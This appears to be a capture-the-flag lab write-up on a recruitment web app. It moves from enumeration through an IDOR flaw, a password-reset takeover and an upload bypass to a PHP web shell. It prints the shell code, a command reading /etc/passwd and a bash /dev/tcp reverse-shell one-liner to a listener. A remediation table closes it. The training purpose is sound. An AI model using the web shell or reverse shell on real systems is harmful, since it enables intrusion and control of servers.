### 1. Reconnaissance and enumeration - Discover what the application exposes
### 2. Insecure Direct Object Reference (IDOR) - Access data belonging to other users
### 3. Weak password reset - Take over an account through a flawed reset mechanism
### 4. Admin panel access - Escalate from a regular user to an administrator
### 5. Remote code execution - Leverage admin functionality to execute commands on the server

# Reconnaissance and Enumeration
1) Enumeration:
   ```
   nmap -sV -sC -p- 10.67.155.72
   ```
  - 22: SSH
  - 80: web application running on Apache
  - 3306: MySQL
  - 8080: Apache default page
  - -> means that the application likely constructs SQL queries, and any input handling weakenesses could lead to SQL-related issues.

2) To check the HTPP response headers:
   ```
   curl -I http://10.67.155.72
   ```
  Apache/2.4.58 (Ubuntu)
  PHPSESSID
  - -> this cookie confirms that PHP session management is in use. 

> now, Technology Stack: Apache + PHP+MySQL - a classic LAMP Configuration

* LAMP Stack:
  - Linux(Operating System)
  - Apache(HTTP Webserver)
  - MySQL(Database)
  - PHP/Pearl/Python(Programming Language)
  -> secure, mature protocol. open source, non-proprietary. flexibility to select the right components for specific projects or business requirements.
  -> Others:WAMP(Microsoft Windows), MAMP(Mac OPS), WIMP(Windows, Internet Information Services webserver from Microsoft)

3) To discover what directories and files exist beyond what the navigtation bar shows:
   ```
   gobuster dir -u http://10.67.155.72 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -x php
   ```
  - /admin - An admin panel exists, but it redirects to the login page. We will need credentials to access it.
  - /api - An API endpoint is present. APIs often expose data in ways the frontend does not.
  - /reset.php - A password reset page. Reset mechanisms are frequently implemented insecurely.
  - /uploads - An uploads directory. If we can upload files, this could be a path to code execution.
  - /profile.php and /dashboard.php - These require authentication, so we need to be logged in to access them.

4) Investigate the api endpoint from gobuster:
   ```
   curl http://10.67.155.72/api/
   ```
  {"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
  -> Already Information Disclosure Issue in a production application



# IDOR
  what we know:  <ins>an authenticated session & the application's structure </ins>

  It uses a predictable identifier to reference objects.

  http://10.67.155.72/profile.php?id=6


# Weak Password Reset
  what we know:  <ins>the administrator's email address: s.mitchell@recruitx.thm </ins>
    
  Let's take over her account!

  1) Navigate to the reset.php?
  2) Enter testuser@fake.thm and submit the form.
  3) get the token. usually sent to the email, not on the screen directly.
  4) use the token as password and login with the administrator's email address.

# Admin Panel Access

accept attribute restricts the file type.

  - Use echo on linux terminal to make any file (txt or phtml)
  - Must select All files when uploading.

# Remote Code Execution

  Webshell: a small script that accepts commands through HTTP parameters and executes them on the server.
  
1) Create and save  shell.phtml:
   ```
       <?php
    if(isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
    ?>
   ```
2) Verify the code execution by running a simple commnand:
   ```
   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=whoami"
   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=id"
   ```
3) Gather more information about the system:
   ```
   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=hostname"
   ```
> Now, Hostname, kernel version, and executing any command on the system.

* www-data is the default user for the Apache web server on Ubujntu

4) Reading Sensitive file 
   ```
   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=cat+/etc/passwd" | grep -v "nologin"
   ```

5) Obtaining a Reverse Shell. setting up a listener:
   ```
   nc -lvnp 4444
   ```

6) Trigger the reverse shell through the web shell.
   ```
   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.155.72/4444+0>%261'"
   ```

7) To listen on:
   ```
   nc -lvnp 4444
   ```

8) To get a flag:
   ```
   cat /var/www/flag.txt
   ```



curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.155.72/4444+0>%261'" -> wrong
curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.67.77.3/4444+0>%261'" -> correct

> Listener(nc) & the command (curl)

# The Attack Chain (Remediation Summary)

Writing the report for this engagement:
|Vulnerability|Serverity|Remediation|
|------|-------|-------|
|IDOR on user profiles and API| High| Implemetn server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requrested resource.|
|Password reset token exposed in the response| Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.|
|Incomplete file extension blocklist|Critical| Use an allowlist rather than a bloacklist. Only permit specific, expected extensions. Validate file content (MIME) type) in addition to the extension. Store uploaded files outside the web root.
|AI endpoint disclosure| Medium | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.|

# Conclusion

1. Enumeration
2. Small flaws chain into big compromises
3. Client-side restrictions are not security.
4. Password reset mechanisms deserve careful attention.
5. Think like an attacker, report like a consultant. 
